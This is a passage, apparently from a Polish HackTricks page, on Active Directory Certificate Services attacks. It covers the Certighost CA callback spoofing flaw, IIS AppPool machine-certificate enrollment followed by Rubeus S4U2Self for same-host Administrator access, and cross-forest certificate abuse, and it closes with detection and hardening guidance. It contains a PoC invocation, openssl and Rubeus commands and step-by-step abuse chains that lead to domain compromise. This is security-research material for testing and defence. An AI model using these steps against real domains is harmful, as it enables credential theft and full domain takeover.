**Certighost** wykorzystuje **ścieżkę enrollment chase / callback w AD CS**, w której CA ufa atrybutom żądania dostarczonym przez requestera przy ustalaniu tożsamości, która powinna zostać umieszczona w wydanym certyfikacie. W publicznym PoC spreparowane żądanie zawiera:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: kontrolowany przez attackera host/IP, z którym CA nawiąże połączenie
- **`rmd`**: nazwa DNS docelowego Domain Controllera, którego tożsamość ma zostać podszyta

Jeśli CA podąży za tym chase, połączy się z attackerem przez **SMB/LSA (`445`)** i **LDAP (`389`)**. Attacker używa **rzeczywistego konta komputera** (zwykle utworzonego za pomocą domyślnego **`ms-DS-MachineAccountQuota`**), dzięki czemu sesja callback uwierzytelnia się jako prawidłowy principal domeny, ale rogue services zwracają zamiast tego atrybuty tożsamości **docelowego DC**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Jeśli CA **nie powiąże kryptograficznie zwróconej tożsamości z uwierzytelnionym principalem callbacku**, może wystawić certyfikat dla **Domain Controllera**, mimo że sesja została uwierzytelniona przy użyciu kontrolowanego przez attackera konta komputera. To sprawia, że ten bug różni się koncepcyjnie od **Certifried**: zamiast przepisywać atrybuty AD, takie jak `dNSHostName`, attacker **podstawia dane tożsamości podczas rozwiązywania callbacku CA**.<sup>[[2]](#references)</sup>

**Przydatne warunki wstępne:**

- Niskie uprawnienia i **credentials domenowe**
- Możliwość **utworzenia lub ponownego użycia konta komputera**
- Osiągalność sieciowa **z CA** do kontrolowanych przez attackera **portów `389` i `445`**
- Podatna / niezałatana ścieżka obsługi żądania CA (aktualizacja Microsoftu z **14 lipca 2026 r.** dodała **weryfikację DC dla `cdc`** oraz **porównanie rozwiązanego SID**)

Uzyskany **`.pfx`** można następnie wykorzystać do **PKINIT**, uzyskując **`.ccache`** oraz, w opublikowanym przebiegu PoC, **NT hash docelowego DC**, co zwykle wystarcza do **pełnego przejęcia domeny**.

### Abuse

Publiczny PoC automatyzuje cały łańcuch:<sup>[[1]](#references)</sup>

1. Utwórz lub ponownie wykorzystaj kontrolowane przez attackera **konto komputera**.
2. Uruchom **rogue listeners LDAP i SMB/LSA** na portach `389` i `445`.
3. Prześlij żądanie certyfikatu zawierające kontrolowane przez attackera atrybuty **`cdc`** i docelowy **`rmd`**.
4. Pozwól CA uwierzytelnić się do rogue listeners przy użyciu kontrolowanego konta komputera, ale odpowiadaj na zapytania o tożsamość atrybutami **docelowego DC**.
5. Odbierz podpisany przez CA **certyfikat DC**, a następnie użyj go do **PKINIT**.
```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```
Przydatne flags runtime z PoC:

- `--listener <ip>`: jawnie wybiera callback IP reklamowany w `cdc`
- `--computer-name <NAME$>`: ponownie wykorzystuje istniejące konto maszyny zamiast tworzyć nowe

**Uwagi operacyjne:**

- PoC wymaga **root**, ponieważ nasłuchuje na **uprzywilejowanych portach** `389` i `445`.
- Pomyślne wykorzystanie podatności zapisuje lokalnie **DC `.pfx`** oraz **Kerberos `.ccache`**.
- Ponieważ certificate jest mapowany na **konto Domain Controller**, dalsze działania mogą obejmować **certificate-based Kerberos auth**, **DCSync** oraz ponowne wykorzystanie odzyskanego **machine NT hash**.<sup>[[2]](#references)</sup>

## IIS AppPool machine enrollment to same-host Administrator

Pula IIS działająca jako `ApplicationPoolIdentity` używa **computer account** swojego hosta do uzyskiwania dostępu wychodzącego do zasobów sieciowych. Dlatego code execution jako `IIS AppPool\<POOL>` pozostaje procesem o niskich uprawnieniach w lokalnym tokenie, ale może wysłać żądanie AD CS, które CA uwierzytelni jako `HOST$`; jest to outbound identity transition, a nie token impersonation ani lokalna eskalacja w stylu Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Ten chain wymaga hosta IIS dołączonego do domeny, Enterprise CA dostępnego przez RPC, opublikowanego template machine-authentication, dla którego computer ma uprawnienia enrollment, obsługi PKINIT oraz dostępności KDC/SMB. Niestandardowa tożsamość puli zmienia outbound principal, dlatego przed założeniem, że jest to `HOST$`, potwierdź, że pula rzeczywiście używa `ApplicationPoolIdentity`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment z kluczem kontrolowanym przez atakującego

Wygeneruj key pair i CSR poza serwerem IIS, zachowując private key. Z zaatakowanego workera prześlij **wyłącznie CSR**. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) tworzy instancję `CertificateAuthority.Request`, ustawia `CertificateTemplate:Machine`, wywołuje `ICertRequest::Submit` i zwraca wydany certificate. Użyj stringa konfiguracji CA `CAHOST\CA-NAME`; zwykły template `Machine` buduje subject na podstawie AD, więc dane subject/SAN podane przez requestera nie są wymagane.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Połącz zwrócony certificate z **odpowiadającym mu zachowanym key**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` działa tylko wtedy, gdy Windows może już powiązać certificate z dostępnym private key; w przypadku oddzielnych plików PEM utwórz PKCS#12 jawnie:<sup>[[19]](#references)[[23]](#references)</sup>
```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
-out machine_cert.pfx -name 'HOST$'
```
Użyj PFX do PKINIT i zachowaj zwrócony TGT komputera w formacie base64 zamiast wstrzykiwać go od razu:<sup>[[5]](#references)[[19]](#references)</sup>
```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
/password:PFX_PASSWORD /nowrap
```
### S4U2Self plus podmiana usługi na tym samym hoście

S4U2Self pozwala usłudze uzyskać ticket **dla samej siebie**, zawierający dane autoryzacyjne innego użytkownika. Korzystając z computer TGT, Rubeus może zażądać takiego ticketu dla uprzywilejowanego użytkownika, zmienić nazwę usługi w zwróconym KRB-CRED na CIFS i wstrzyknąć go. To lokalny prymityw „delegate to thyself”: nie wymaga S4U2Proxy ani wpisu `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>
```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
/altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```
Podstawiony ticket jest użyteczny wyłącznie przez usługi na **tym samym koncie/kluczu komputera** (w tym przypadku CIFS na `HOST`). Nie jest to możliwy do ponownego użycia ticket Administratora dla innych maszyn w domenie. Ponadto zademonstrowany rezultat to uprzywilejowany dostęp SMB/systemu plików jako Administrator; uzyskanie procesu lokalnego `NT AUTHORITY\SYSTEM` nadal wymaga osobnego kroku zdalnego wykonania.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Wykrywanie i hardening

- Na CA koreluj zdarzenia Certification Services **4886** (otrzymano żądanie) i **4887** (wydano certyfikat) pod kątem nieoczekiwanych żądań szablonu `Machine` składanych przez konta serwerów IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Na DC zdarzenie **4768** zawiera pola certyfikatu, gdy używane jest uwierzytelnianie certificate pre-authentication; generuj alerty dla nietypowych żądań TGT PKINIT dotyczących kont serwerów webowych. Następnie sprawdź żądania **4769** obejmujące uprzywilejowaną podszywającą się tożsamość i ten sam host. Ponieważ Rubeus `/altservice` przepisuje nazwę usługi KRB-CRED po stronie klienta, nie należy wymagać, aby nazwa usługi w zdarzeniu 4769 po stronie DC była `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Wyszukuj przypadki, w których `w3wp.exe` łączy się z endpointami RPC CA, nieoczekiwane tworzenie plików ASPX, dostęp uwierzytelniony przez Kerberos do udziałów administracyjnych oraz aktywność polegającą na zrzucaniu secrets. W miarę możliwości ograniczaj dostęp warstwy aplikacji do CA RPC/KDC/SMB oraz usuwaj uprawnienia computer enrollment lub szablony machine-authentication, które nie są wymagane operacyjnie.<sup>[[19]](#references)</sup>

## Kompromitowanie lasów za pomocą certificates wyjaśnione w stronie biernej

### Łamanie zaufania między lasami przez skompromitowane CA

Konfiguracja **cross-forest enrollment** jest stosunkowo prosta. **Root CA certificate** z resource forest jest **publikowany w account forests** przez administratorów, a certificates **enterprise CA** z resource forest są **dodawane do kontenerów `NTAuthCertificates` i AIA w każdym account forest**. Mówiąc dokładniej, taka konfiguracja daje **CA w resource forest pełną kontrolę** nad wszystkimi innymi forest, dla których zarządza on PKI. Jeśli ten CA zostanie **skompromitowany przez attackerów**, certificates dla wszystkich użytkowników zarówno w resource forest, jak i account forests mogłyby zostać przez nich **sfałszowane**, łamiąc w ten sposób granicę bezpieczeństwa forest.<sup>[[6]](#references)</sup>

### Uprawnienia enrollment przyznane foreign principals

W środowiskach wieloforestowych należy zachować ostrożność w przypadku Enterprise CA, które **publikują certificate templates** umożliwiające **Authenticated Users lub foreign principals** (użytkownikom/grupom spoza forest, do którego należy Enterprise CA) uzyskanie **praw enrollment i edycji**.\
Po uwierzytelnieniu przez trust AD dodaje **SID Authenticated Users** do tokenu użytkownika. Jeśli więc domena posiada Enterprise CA z template, który **zezwala Authenticated Users na prawa enrollment**, użytkownik z innego forest może potencjalnie **dokonać enrollment w tym template**. Podobnie, jeśli **template jawnie przyznaje prawa enrollment foreign principal**, tworzona jest w ten sposób **relacja kontroli dostępu między forest**, umożliwiająca principalowi z jednego forest **dokonanie enrollment w template z innego forest**.

Oba scenariusze prowadzą do **zwiększenia attack surface** między jednym forest a drugim. Ustawienia certificate template mogą zostać wykorzystane przez attackera do uzyskania dodatkowych uprawnień w foreign domain.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 repozytorium PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - analiza techniczna Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – blog SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: nadużywanie Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, nowe metody uwierzytelniania i żądań oraz więcej](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: nadużywanie mapowania kont Key Trust w celu przejęcia konta](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – historia Enhanced Key (mis)Usage](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying do AD Certificate Services przez RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: dostęp shell do ADCS CA z YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – technika nadużycia ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – technika nadużycia ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – eskalacja uprawnień (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: nie tylko kolejny AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: błędna konfiguracja i exploitation](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – ponowne omówienie „Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC enrollment AD CS w IIS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – eskalacja uprawnień z IIS AppPool przez endpoint RPC AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – tożsamości Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – polecenie pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – audyt Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – zdarzenie 4768: zażądano ticketu uwierzytelniania Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – zdarzenie 4769: zażądano ticketu usługi Kerberos](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – toolkit exploitation AD CS PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
